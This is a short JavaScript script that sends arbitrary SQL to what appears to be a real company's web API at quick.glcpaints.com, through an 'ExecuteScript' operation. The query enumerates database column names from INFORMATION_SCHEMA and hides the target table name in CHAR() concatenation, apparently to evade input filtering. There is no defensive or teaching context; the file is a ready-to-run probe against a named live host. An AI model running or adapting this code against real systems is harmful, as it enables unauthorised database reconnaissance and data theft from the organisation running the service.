async function run() {
  const sql = `
    SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(80)+CHAR(114)+CHAR(105)+CHAR(99)+CHAR(101)+CHAR(84)+CHAR(121)+CHAR(112)+CHAR(101)+CHAR(77)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114);
  `;

  try {
    const res = await fetch('https://quick.glcpaints.com:7003/General/GeneralAPI/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'SP_Name': 'APIPlusQueryOperation'
      },
      body: JSON.stringify({
        Operation: 'ExecuteScript',
        SqlStatement: sql,
        AppVersionWeb: '225',
        PlatForm: 'web'
      })
    });
    const text = await res.text();
    console.log(text);
  } catch (err) {
    console.error(err);
  }
}
run();
